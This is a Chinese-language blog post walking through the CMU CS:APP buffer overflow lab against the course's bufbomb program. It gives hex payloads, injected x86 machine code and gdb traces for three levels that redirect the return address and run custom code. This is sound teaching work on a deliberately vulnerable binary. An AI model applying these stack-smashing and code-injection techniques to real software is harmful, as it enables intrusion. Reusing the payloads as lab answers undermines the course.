<!DOCTYPE html>
<html lang="en" prefix="og: http://ogp.me/ns# fb: https://www.facebook.com/2008/fbml">
<head>
    <title>Buffer Overflow Attack实验 - Living@Greatwall</title>
    <!-- Using the latest rendering mode for IE -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">



<link rel="canonical" href="http://yangjin-unique.github.io/buffer-overflow-attackshi-yan.html">

        <meta name="author" content="jin" />
        <meta name="keywords" content="buffer overflow attack,security,hack,x86,stack" />
        <meta name="description" content="这是cmu经典课程csapp的实验之一，主要任务是对课程提供的bufbomb程序进行buffer overflow攻击，以帮助我们深入理解x86 IA-32体系结构的函数调用惯例和栈组织结构，从而认识到这种攻击方法的本质，对我们编写安全的系统级代码非常有好处。这些实验同时也展示了如何攻击操作系统和网络服务器的安全弱点。 实验提供了以下3个可执行文件： - bufbomb: 这是我们要攻击的目标程序； - makecookie：根据用户id生成一个唯一的cookie，这个主要是防止抄袭作业:)； - hex2raw：将16进制的ascii值转换称对于的ascii字符； bufbomb程序会从标准输入中读取一个字符串，调用getbuf函数： /* Buffer size for getbuf */ #define NORMAL_BUFFER_SIZE 32 int getbuf() { char buf[NORMAL_BUFFER_SIZE]; Gets(buf); return 1; } 显然如果用户输入的字符串长度大于31时，就会破坏bufbomb的栈，如果在输入的字符串中带有特殊的地址和指令，就达到了攻击目的。下面的几个实验任务都是需要在这个字符串中嵌入特殊的指令和地址来完成实验任务。 Test 1: Candle bufbomb中函数test会调用getbuf，如下： void test() { int val; /* Put canary ..." />

        <meta property="og:site_name" content="Living@Greatwall" />
        <meta property="og:type" content="article"/>
        <meta property="og:title" content="Buffer Overflow Attack实验"/>
        <meta property="og:url" content="http://yangjin-unique.github.io/buffer-overflow-attackshi-yan.html"/>
        <meta property="og:description" content="这是cmu经典课程csapp的实验之一，主要任务是对课程提供的bufbomb程序进行buffer overflow攻击，以帮助我们深入理解x86 IA-32体系结构的函数调用惯例和栈组织结构，从而认识到这种攻击方法的本质，对我们编写安全的系统级代码非常有好处。这些实验同时也展示了如何攻击操作系统和网络服务器的安全弱点。 实验提供了以下3个可执行文件： - bufbomb: 这是我们要攻击的目标程序； - makecookie：根据用户id生成一个唯一的cookie，这个主要是防止抄袭作业:)； - hex2raw：将16进制的ascii值转换称对于的ascii字符； bufbomb程序会从标准输入中读取一个字符串，调用getbuf函数： /* Buffer size for getbuf */ #define NORMAL_BUFFER_SIZE 32 int getbuf() { char buf[NORMAL_BUFFER_SIZE]; Gets(buf); return 1; } 显然如果用户输入的字符串长度大于31时，就会破坏bufbomb的栈，如果在输入的字符串中带有特殊的地址和指令，就达到了攻击目的。下面的几个实验任务都是需要在这个字符串中嵌入特殊的指令和地址来完成实验任务。 Test 1: Candle bufbomb中函数test会调用getbuf，如下： void test() { int val; /* Put canary ..."/>
        <meta property="article:published_time" content="2016-02-19" />
            <meta property="article:section" content="c&c++" />
            <meta property="article:tag" content="buffer overflow attack" />
            <meta property="article:tag" content="security" />
            <meta property="article:tag" content="hack" />
            <meta property="article:tag" content="x86" />
            <meta property="article:tag" content="stack" />
            <meta property="article:author" content="jin" />


    <!-- Bootstrap -->
        <link rel="stylesheet" href="http://yangjin-unique.github.io/theme/css/bootstrap.min.css" type="text/css"/>
    <link href="http://yangjin-unique.github.io/theme/css/font-awesome.min.css" rel="stylesheet">

    <link href="http://yangjin-unique.github.io/theme/css/pygments/native.css" rel="stylesheet">
    <link rel="stylesheet" href="http://yangjin-unique.github.io/theme/css/style.css" type="text/css"/>





</head>
<body>

<div class="navbar navbar-default navbar-fixed-top" role="navigation">
	<div class="container">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a href="http://yangjin-unique.github.io/" class="navbar-brand">
Living@Greatwall            </a>
        </div>
        <div class="collapse navbar-collapse navbar-ex1-collapse">
            <ul class="nav navbar-nav">
                        <li class="active">
                            <a href="http://yangjin-unique.github.io/category/cc.html">C&c++</a>
                        </li>
                        <li >
                            <a href="http://yangjin-unique.github.io/category/linux.html">Linux</a>
                        </li>
                        <li >
                            <a href="http://yangjin-unique.github.io/category/os.html">Os</a>
                        </li>
                        <li >
                            <a href="http://yangjin-unique.github.io/category/python.html">Python</a>
                        </li>
                        <li >
                            <a href="http://yangjin-unique.github.io/category/tools.html">Tools</a>
                        </li>
            </ul>
            <ul class="nav navbar-nav navbar-right">
              <li><a href="http://yangjin-unique.github.io/archives.html"><i class="fa fa-th-list"></i><span class="icon-label">Archives</span></a></li>
            </ul>
        </div>
        <!-- /.navbar-collapse -->
    </div>
</div> <!-- /.navbar -->
<!-- Banner -->
<!-- End Banner -->
<div class="container">
    <div class="row">
        <div class="col-sm-9">
    <section id="content">
        <article>
            <header class="page-header">
                <h1>
                    <a href="http://yangjin-unique.github.io/buffer-overflow-attackshi-yan.html"
                       rel="bookmark"
                       title="Permalink to Buffer Overflow Attack实验">
                        Buffer Overflow Attack实验
                    </a>
                </h1>
            </header>
            <div class="entry-content">
                <div class="panel">
                    <div class="panel-body">
<footer class="post-info">
    <span class="label label-default">Date</span>
    <span class="published">
        <i class="fa fa-calendar"></i><time datetime="2016-02-19T00:00:00+08:00"> Fri 19 February 2016</time>
    </span>





<span class="label label-default">Tags</span>
	<a href="http://yangjin-unique.github.io/tag/buffer-overflow-attack.html">buffer overflow attack</a>
        /
	<a href="http://yangjin-unique.github.io/tag/security.html">security</a>
        /
	<a href="http://yangjin-unique.github.io/tag/hack.html">hack</a>
        /
	<a href="http://yangjin-unique.github.io/tag/x86.html">x86</a>
        /
	<a href="http://yangjin-unique.github.io/tag/stack.html">stack</a>
    
</footer><!-- /.post-info -->                    </div>
                </div>
                <p>这是cmu经典课程csapp的实验之一，主要任务是对课程提供的bufbomb程序进行buffer overflow攻击，以帮助我们深入理解x86 IA-32体系结构的函数调用惯例和栈组织结构，从而认识到这种攻击方法的本质，对我们编写安全的系统级代码非常有好处。这些实验同时也展示了如何攻击操作系统和网络服务器的安全弱点。</p>
<p>实验提供了以下3个可执行文件：
- bufbomb: 这是我们要攻击的目标程序；
- makecookie：根据用户id生成一个唯一的cookie，这个主要是防止抄袭作业:)；
- hex2raw：将16进制的ascii值转换称对于的ascii字符；</p>
<p>bufbomb程序会从标准输入中读取一个字符串，调用getbuf函数：</p>
<div class="highlight"><pre><span class="cm">/* Buffer size for getbuf */</span>
<span class="cp">#define NORMAL_BUFFER_SIZE 32</span>

<span class="kt">int</span> <span class="nf">getbuf</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">NORMAL_BUFFER_SIZE</span><span class="p">];</span>
    <span class="n">Gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>显然如果用户输入的字符串长度大于31时，就会破坏bufbomb的栈，如果在输入的字符串中带有特殊的地址和指令，就达到了攻击目的。下面的几个实验任务都是需要在这个字符串中嵌入特殊的指令和地址来完成实验任务。</p>
<h3>Test 1: Candle</h3>
<p>bufbomb中函数test会调用getbuf，如下：</p>
<div class="highlight"><pre> <span class="kt">void</span> <span class="nf">test</span><span class="p">()</span>
 <span class="p">{</span>
     <span class="kt">int</span> <span class="n">val</span><span class="p">;</span>
     <span class="cm">/* Put canary on stack to detect possible corruption */</span>
     <span class="k">volatile</span> <span class="kt">int</span> <span class="n">local</span> <span class="o">=</span> <span class="n">uniqueval</span><span class="p">();</span>

     <span class="n">val</span> <span class="o">=</span> <span class="n">getbuf</span><span class="p">();</span>

     <span class="cm">/* Check for corrupted stack */</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">local</span> <span class="o">!=</span> <span class="n">uniqueval</span><span class="p">())</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Sabotaged!: the stack has been corrupted</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
     <span class="p">}</span>
     <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">val</span> <span class="o">==</span> <span class="n">cookie</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Boom!: getbuf returned 0x%x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
        <span class="n">validate</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Dud: getbuf returned 0x%x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
     <span class="p">}</span>
 <span class="p">}</span>
</pre></div>


<p>当test执行完getbuf后会继续执行后面的代码，这个实验的任务是要改变这个执行路线，即当getbuf返回后不会沿着test执行下去，而是去执行smoke函数：</p>
<div class="highlight"><pre><span class="kt">void</span> <span class="nf">smoke</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Smoke!: You called smoke()</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">validate</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>


<p>这个实验挺简单，就是需要改变getbuf的返回地址为smoke入口地址即可。首先对bufbomb进行反汇编：
    objdump -d bufbomb &gt; bufbomb.asm
找到smoke的入口地址为：0x08048c18，下面如何将getbuf的返回地址替换为这个地址呢？这里我们要对x86的函数调用栈帧非常熟悉，可参考： https://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames。
当调用getbuf时，栈帧大概位置如下：</p>
<div class="highlight"><pre>high ------------------------
    |  return addr to test() |
    |------------------------|
    |     ebp for test()     |
    |------------------------|&lt;--- [ebp]
    |                        |
    |------------------------|    total 40 bytes                
    |        32 bytes        |
    |         buf            |
    |------------------------|&lt;--- [ebp-0x28], start of buf
    |                        |
    |------------------------|
    |                        |&lt;--- esp
low |------------------------|
</pre></div>


<p>上面buf局部变量是保存输入的字符串的，它的地址为ebp-0x28（通过查看getbuf的反汇编代码），我们要修改的地址在return addr。显然我们输入的字符串只要一直overflow到return addr即可，总共44字节，最后加上smoke的地址，即能完成修改。
由于输入的是字符串，而这个我们要将smoke的地址（4个字节）转换成对应的字符，hex2raw能帮我们完成这个转换，但由于该程序是x86-64平台的，不能在32位系统上运行，可用下面的python来代替：</p>
<div class="highlight"><pre><span class="c">#! /usr/bin/env python</span>
<span class="c"># coding=utf-8</span>

<span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">os</span>

<span class="n">raw</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
<span class="nb">input</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">()</span>
<span class="k">for</span> <span class="nb">hex</span> <span class="ow">in</span> <span class="nb">input</span><span class="o">.</span><span class="n">split</span><span class="p">():</span>
    <span class="n">raw</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="nb">hex</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>
<span class="k">print</span> <span class="n">raw</span>
</pre></div>


<p>我们将输入的字符串对应的16进制值写到一个文本文件level1.txt中，内容如下：</p>
<div class="highlight"><pre>31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 18 8c 04 08
</pre></div>


<p>前面的44个字节为任意字符（但不能为\n，表示输入结束），最后的4个字节为smoke的入口地址（注意x86是little endian字节序）。然后用hex2raw.py将这个文件转换成对应的字符串ans.raw。</p>
<p>下面通过gdb来检验一下是否成功。在gdb中getbuf处设置断点:</p>
<div class="highlight"><pre><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="o">-</span><span class="n">u</span> <span class="n">yj</span> <span class="o">&lt;</span> <span class="n">ans</span><span class="p">.</span><span class="n">raw</span> 
<span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">yj</span><span class="o">/</span><span class="n">yangjin</span><span class="o">/</span><span class="n">cs_app</span><span class="o">/</span><span class="n">buflab</span><span class="o">/</span><span class="n">buflab</span><span class="o">-</span><span class="n">handout</span><span class="o">/</span><span class="n">bufbomb</span> <span class="o">-</span><span class="n">u</span> <span class="n">yj</span> <span class="o">&lt;</span> <span class="n">ans</span><span class="p">.</span><span class="n">raw</span>
<span class="nl">Userid</span><span class="p">:</span> <span class="n">yj</span>
<span class="nl">Cookie</span><span class="p">:</span> <span class="mh">0x3ab24af4</span>

<span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x080491fa</span> <span class="k">in</span> <span class="n">getbuf</span> <span class="p">()</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">info</span> <span class="n">registers</span> 
<span class="n">eax</span>            <span class="mh">0x615ef6a</span>    <span class="mi">102100842</span>
<span class="n">ecx</span>            <span class="mh">0xb7fbf068</span>   <span class="o">-</span><span class="mi">1208225688</span>
<span class="n">edx</span>            <span class="mh">0xb7fbf3cc</span>   <span class="o">-</span><span class="mi">1208224820</span>
<span class="n">ebx</span>            <span class="mh">0x0</span>  <span class="mi">0</span>
<span class="n">esp</span>            <span class="mh">0x556836a8</span>   <span class="mh">0x556836a8</span> <span class="o">&lt;</span><span class="n">_reserved</span><span class="o">+</span><span class="mi">1037992</span><span class="o">&gt;</span>
<span class="n">ebp</span>            <span class="mh">0x556836e0</span>   <span class="mh">0x556836e0</span> <span class="o">&lt;</span><span class="n">_reserved</span><span class="o">+</span><span class="mi">1038048</span><span class="o">&gt;</span>
<span class="n">esi</span>            <span class="mh">0x55686018</span>   <span class="mi">1432903704</span>
<span class="n">edi</span>            <span class="mh">0x1</span>  <span class="mi">1</span>
<span class="n">eip</span>            <span class="mh">0x80491fa</span>    <span class="mh">0x80491fa</span> <span class="o">&lt;</span><span class="n">getbuf</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;</span>
<span class="n">eflags</span>         <span class="mh">0x212</span>    <span class="p">[</span> <span class="n">AF</span> <span class="n">IF</span> <span class="p">]</span>
<span class="n">cs</span>             <span class="mh">0x73</span> <span class="mi">115</span>
<span class="n">ss</span>             <span class="mh">0x7b</span> <span class="mi">123</span>
<span class="n">ds</span>             <span class="mh">0x7b</span> <span class="mi">123</span>
<span class="n">es</span>             <span class="mh">0x7b</span> <span class="mi">123</span>
<span class="n">fs</span>             <span class="mh">0x0</span>  <span class="mi">0</span>
<span class="n">gs</span>             <span class="mh">0x33</span> <span class="mi">51</span>
</pre></div>


<p>查看当前栈(esp=0x556836a8)的信息：</p>
<div class="highlight"><pre>(gdb) x/20x 0x556836a8
0x556836a8 &lt;_reserved+1037992&gt;: 0x0000513a  0xb7fbf3cc  0x0000000c  0x1126312e
0x556836b8 &lt;_reserved+1038008&gt;: 0x00000000  0xb7fc0898  0x00000000  0x08048da8
0x556836c8 &lt;_reserved+1038024&gt;: 0x0000513a  0x0804836c  0xb7e586b1  0xb7fbf000
0x556836d8 &lt;_reserved+1038040&gt;: 0xb7fbfac0  0xb7fbfd80  0x55683710  0x08048dbe
0x556836e8 &lt;_reserved+1038056&gt;: 0xb7fbfac0  0x0804a57e  0x55683720  0x00000001
</pre></div>


<p>buf的起始地址为：ebp-0x28=0x556836e0-0x28=0x556836b8。上面打印的栈空间第4行的最后4个字节ox08048dbe就是getbuf的return addr，同时也是test函数的call getbuf的下一条指令：</p>
<div class="highlight"><pre>8048daa &lt;test&gt;:
8048daa:    55                      push   %ebp
8048dab:    89 e5                   mov    %esp,%ebp
8048dad:    53                      push   %ebx
8048dae:    83 ec 24                sub    $0x24,%esp
8048db1:    e8 da ff ff ff          call   8048d90 &lt;uniqueval&gt;
8048db6:    89 45 f4                mov    %eax,-0xc(%ebp)
8048db9:    e8 36 04 00 00          call   80491f4 &lt;getbuf&gt;
8048dbe:    89 c3                   mov    %eax,%ebx
8048dc0:    e8 cb ff ff ff          call   8048d90 &lt;uniqueval&gt;
</pre></div>


<p>然后继续单步执行，</p>
<div class="highlight"><pre><span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">n</span>
<span class="nx">Single</span> <span class="nx">stepping</span> <span class="nx">until</span> <span class="nx">exit</span> <span class="nx">from</span> <span class="kd">function</span> <span class="nx">getbuf</span><span class="p">,</span>
<span class="nx">which</span> <span class="nx">has</span> <span class="nx">no</span> <span class="nx">line</span> <span class="nx">number</span> <span class="nx">information</span><span class="p">.</span>
<span class="mh">0x08048c18</span> <span class="k">in</span> <span class="nx">smoke</span> <span class="p">()</span>
<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">x</span><span class="o">/</span><span class="mi">20</span><span class="nx">x</span> <span class="mh">0x556836a8</span>
<span class="mh">0x556836a8</span> <span class="o">&lt;</span><span class="nx">_reserved</span><span class="o">+</span><span class="mi">1037992</span><span class="o">&gt;:</span> <span class="mh">0x556836b8</span>  <span class="mh">0xb7fbf3cc</span>  <span class="mh">0x0000000c</span>  <span class="mh">0x1126312e</span>
<span class="mh">0x556836b8</span> <span class="o">&lt;</span><span class="nx">_reserved</span><span class="o">+</span><span class="mi">1038008</span><span class="o">&gt;:</span> <span class="mh">0x31313131</span>  <span class="mh">0x31313131</span>  <span class="mh">0x31313131</span>  <span class="mh">0x31313131</span>
<span class="mh">0x556836c8</span> <span class="o">&lt;</span><span class="nx">_reserved</span><span class="o">+</span><span class="mi">1038024</span><span class="o">&gt;:</span> <span class="mh">0x31313131</span>  <span class="mh">0x31313131</span>  <span class="mh">0x31313131</span>  <span class="mh">0x31313131</span>
<span class="mh">0x556836d8</span> <span class="o">&lt;</span><span class="nx">_reserved</span><span class="o">+</span><span class="mi">1038040</span><span class="o">&gt;:</span> <span class="mh">0x31313131</span>  <span class="mh">0x31313131</span>  <span class="mh">0x31313131</span>  <span class="mh">0x08048c18</span>
<span class="mh">0x556836e8</span> <span class="o">&lt;</span><span class="nx">_reserved</span><span class="o">+</span><span class="mi">1038056</span><span class="o">&gt;:</span> <span class="mh">0xb7fbfa00</span>  <span class="mh">0x0804a57e</span>  <span class="mh">0x55683720</span>  <span class="mh">0x00000001</span>
</pre></div>


<p>从上面看到我们从buf（0x556836b8）开始的内容全部改成了我们的输入的字符串，并且可以看到getbuf完后成功返回到smoke的入口地址。最后继续：</p>
<div class="highlight"><pre>(gdb) c
Continuing.
Type string:Smoke!: You called smoke()
VALID
NICE JOB!
[Inferior 1 (process 20794) exited normally]
</pre></div>


<p>成功完成！</p>
<h3>Test2: Sparkler</h3>
<p>bufbomb中有个fizz函数：</p>
<div class="highlight"><pre><span class="nt">void</span> <span class="nt">fizz</span><span class="o">(</span><span class="nt">int</span> <span class="nt">val</span><span class="o">)</span>
<span class="p">{</span>
    <span class="n">if</span> <span class="p">(</span><span class="n">val</span> <span class="o">==</span> <span class="n">cookie</span><span class="p">)</span> <span class="err">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Fizz!: You called fizz(0x%x)\n&quot;</span><span class="o">,</span> <span class="n">val</span><span class="p">);</span>
        <span class="n">validate</span><span class="p">(</span><span class="m">1</span><span class="p">);</span>
    <span class="p">}</span> <span class="nt">else</span>
        <span class="nt">printf</span><span class="o">(</span><span class="s2">&quot;Misfire: You called fizz(0x%x)\n&quot;</span><span class="o">,</span> <span class="nt">val</span><span class="o">);</span>
    <span class="nt">exit</span><span class="o">(</span><span class="nt">0</span><span class="o">);</span>
<span class="err">}</span>
</pre></div>


<p>同样这个任务也是要test执行完getbuf后跳转到执行fizz，与之前不同的是，fizz有个参数，同时要将这个参数设为cookie这个值。这个任务主要是要知道函数参数如何入栈(几种不同的方式：cdecl, stdcall, fastcall, thiscall等)，可参考前面提到的文章。</p>
<p>将getbuf的返回地址设为fizz入口地址这个跟前面实验一样，关键是在哪里设置这个参数。
前面gdb调试可看到在getbuf中执行时，ebp=0x556836e0，所以当getbuf执行完跳入fizz之前，esp=0x556836e8（为什么？因为getbuf最后执行两条指令leave和ret，leave会将ebp赋给esp，然后pop ebp，而ret指令相当于pop eip，共两次pop，整个过程相当于esp=ebp+4+4）。
fizz反汇编如下：</p>
<div class="highlight"><pre>8048c42 &lt;fizz&gt;:
8048c42:    55                      push   %ebp
8048c43:    89 e5                   mov    %esp,%ebp
8048c45:    83 ec 18                sub    $0x18,%esp
8048c48:    8b 45 08                mov    0x8(%ebp),%eax
8048c4b:    3b 05 08 d1 04 08       cmp    0x804d108,%eax
</pre></div>


<p>进入fizz后，执行第一条指令push ebp，此时esp=esp-4=0x556836e4，然后执行mov %esp, %ebp，此时ebp=0x556836e4。根据上面的cmp指令可看出fizz的参数地址为ebp+0x8=0x556836ec，
这就是我们要放入cookie的值的地址（buf的起始地址仍跟前面一样0x556836b8）。
level2.txt的输入字符串如下：</p>
<div class="highlight"><pre>31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 42 8c 04 08 31 31 31 31 f4 4a b2 3a
</pre></div>


<p>上面08048c42是fizz的入口地址，3ab24af4是cookie。
执行如下命令：</p>
<div class="highlight"><pre>cat level1.txt  | ./hex2raw.py | ./bufbomb -u yj
Userid: yj
Cookie: 0x3ab24af4
Type string:Fizz!: You called fizz(0x3ab24af4)
VALID
NICE JOB!
</pre></div>


<p>成功完成！</p>
<h3>Test 3: Firecracker</h3>
<p>前面两个攻击都只是修改了函数调用路线，没什么卵用，本实验将实现如何让程序执行我们自己的hack的代码，这要就能随心所欲的干坏事了:)。在bufbomb中有如下代码：</p>
<div class="highlight"><pre><span class="kt">int</span> <span class="n">global_value</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="kt">void</span> <span class="nf">bang</span><span class="p">(</span><span class="kt">int</span> <span class="n">val</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">global_value</span> <span class="o">==</span> <span class="n">cookie</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Bang!: You set global_value to 0x%x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">global_value</span><span class="p">);</span>
        <span class="n">validate</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Misfire: global_value = 0x%x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">global_value</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>


<p>我们的任务是在getbuf返回时执行我们自己定义的指令，这些指令要修改global_value值为cookie，然后执行bang函数。</p>
<p>总的思路就是编写修改global_value的汇编指令放在buf中，然后跟前面的实验一样，只是将跳转的地址改成buf的地址，这要执行getbuf后就跳到去执行汇编指令，这些汇编指令除了要修改global_value的值外，还要确保执行完后要能跳到bang函数执行。
我们的汇编指令如下(example.S)：</p>
<div class="highlight"><pre>movl $0x3ab24af4, 0x0804d100  #put cookie value in global_value (addr: 0x0804d100)
pushl $0x08048c9d             #push bang entry address into stack
ret
</pre></div>


<p>注意global_value的地址是将bufbomb的bss段objdump出来的。下面如何将这些汇编指令转换称机器指令呢？
可以使用如下命令：
    unix&gt; gcc -m32 -c example.S
    unix&gt; objdump -d example.o &gt; example.d</p>
<p>example.d如下内容：</p>
<div class="highlight"><pre>00000000 &lt;.text&gt;:
0:  c7 05 00 d1 04 08 f4    movl   $0x3ab24af4,0x804d100
7:  4a b2 3a 
a:  68 9d 8c 04 08          push   $0x8048c9d
f:  c3                      ret
</pre></div>


<p>前面的数字就是对应的机器码，将这些机器码写入level3.txt，还有buf的起始地址：</p>
<div class="highlight"><pre>c7 05 00 d1 04 08 f4 4a b2 3a 68 9d 8c 04 08 c3 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 b8 36 68 55
</pre></div>


<p>最后运行: </p>
<div class="highlight"><pre>cat level3.txt  | ./hex2raw.py | ./bufbomb -u yj
Userid: yj
Cookie: 0x3ab24af4
Type string:Bang!: You set global_value to 0x3ab24af4
VALID
NICE JOB!
</pre></div>


<p>完成任务！</p>
            </div>
            <!-- /.entry-content -->
    <hr/>
    <section class="comments" id="comments">
        <h2>Comments</h2>

        <div id="disqus_thread"></div>
        <script type="text/javascript">
            /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
            var disqus_shortname = 'yangjin-unique'; // required: replace example with your forum shortname

                    var disqus_identifier = 'buffer-overflow-attackshi-yan';
                var disqus_url = 'http://yangjin-unique.github.io/buffer-overflow-attackshi-yan.html';

            var disqus_config = function () {
                this.language = "en";
            };

            /* * * DON'T EDIT BELOW THIS LINE * * */
            (function () {
                var dsq = document.createElement('script');
                dsq.type = 'text/javascript';
                dsq.async = true;
                dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
            })();
        </script>
        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by
            Disqus.</a></noscript>
        <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

    </section>
        </article>
    </section>

        </div>
        <div class="col-sm-3" id="sidebar">
            <aside>

<section class="well well-sm">
    <ul class="list-group list-group-flush">





    <li class="list-group-item"><h4><i class="fa fa-external-link-square fa-lg"></i><span class="icon-label">Links</span></h4>
      <ul class="list-group" id="links">
        <li class="list-group-item">
            <a href="http://getpelican.com/" target="_blank">
                Pelican
            </a>
        </li>
        <li class="list-group-item">
            <a href="http://lxr.free-electrons.com" target="_blank">
                Online Linux Kernel Source Code
            </a>
        </li>
        <li class="list-group-item">
            <a href="http://coolshell.cn" target="_blank">
                酷壳CoolShell
            </a>
        </li>
      </ul>
    </li>
    </ul>
</section>
            </aside>
        </div>
    </div>
</div>
<footer>
   <div class="container">
      <hr>
      <div class="row">
         <div class="col-xs-10">&copy; 2016 Jin
            &middot; Powered by <a href="https://github.com/DandyDev/pelican-bootstrap3" target="_blank">pelican-bootstrap3</a>,
            <a href="http://docs.getpelican.com/" target="_blank">Pelican</a>,
            <a href="http://getbootstrap.com" target="_blank">Bootstrap</a>         </div>
         <div class="col-xs-2"><p class="pull-right"><i class="fa fa-arrow-up"></i> <a href="#">Back to top</a></p></div>
      </div>
   </div>
</footer>
<script src="http://yangjin-unique.github.io/theme/js/jquery.min.js"></script>

<!-- Include all compiled plugins (below), or include individual files as needed -->
<script src="http://yangjin-unique.github.io/theme/js/bootstrap.min.js"></script>

<!-- Enable responsive features in IE8 with Respond.js (https://github.com/scottjehl/Respond) -->
<script src="http://yangjin-unique.github.io/theme/js/respond.min.js"></script>

    <!-- Disqus -->
    <script type="text/javascript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'yangjin-unique'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function () {
            var s = document.createElement('script');
            s.async = true;
            s.type = 'text/javascript';
            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
        }());
    </script>
    <!-- End Disqus Code -->

</body>
</html>